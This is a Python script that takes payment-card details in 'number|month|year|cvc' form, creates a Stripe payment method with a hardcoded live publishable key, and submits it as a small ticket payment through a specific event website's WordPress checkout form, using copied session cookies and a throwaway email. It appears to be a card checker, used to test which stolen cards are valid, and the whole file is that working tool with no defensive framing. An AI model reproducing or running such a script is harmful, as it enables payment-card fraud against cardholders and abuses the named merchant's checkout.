import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'pragma': 'no-cache',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51PEfCJESiHMhR64JpuPUNSPufzFc5loWPiYRVm5DAM2tVyYF0OvbocX9ohHG3yfoqHPfMdsV7YJZEi13YZAid4ci00wPuyHAfj'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
	    '__stripe_mid': '811bd50a-081d-4b36-b27a-0ac05c72da4c0b0e6a',
	    '__stripe_sid': 'e0e77ab6-d44c-4fde-9d21-980f41b8951f95989b',
	    'twp_session': '2c8adaa0dce6901d83235ea83424d0d3%7C%7C1726857169%7C%7C1726856809',
	    's40wjjhc': 'qcwv26ndyyri',
	    '67wrw4n3': 'dvyjhb8c4rtz',
	    '__utma': '92712271.1414665042.1726855371.1726855371.1726855371.1',
	    '__utmc': '92712271',
	    '__utmz': '92712271.1726855371.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
	    '__utmt': '1',
	    '__utmb': '92712271.1.10.1726855371',
	}
	
	headers = {
	    'authority': 'www.chitownshowdown.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=811bd50a-081d-4b36-b27a-0ac05c72da4c0b0e6a; __stripe_sid=e0e77ab6-d44c-4fde-9d21-980f41b8951f95989b; twp_session=2c8adaa0dce6901d83235ea83424d0d3%7C%7C1726857169%7C%7C1726856809; s40wjjhc=qcwv26ndyyri; 67wrw4n3=dvyjhb8c4rtz; __utma=92712271.1414665042.1726855371.1726855371.1726855371.1; __utmc=92712271; __utmz=92712271.1726855371.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; __utmb=92712271.1.10.1726855371',
	    'origin': 'https://www.chitownshowdown.com',
	    'pragma': 'no-cache',
	    'referer': 'https://www.chitownshowdown.com/ticketcheckout/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1726855407812',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=706&_fluentform_3_fluentformnonce=14072e3bd7&_wp_http_referer=%2Fticketcheckout%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=rodamuser69%40outlook.com&address_1%5Baddress_line_1%5D=&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=&address_1%5Bstate%5D=&address_1%5Bzip%5D=&address_1%5Bcountry%5D=&phone=&payment_input_1=30&payment_input_2=45&payment_input_4=65&payment_input_3=30&item-quantity_1=&item-quantity_5=&item-quantity_3=&item-quantity_2=&payment_input=5&input_text_1=N%2FA&input_text=&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '3',
	}
	
	r2 = requests.post(
	    'https://www.chitownshowdown.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	return (r2.json())
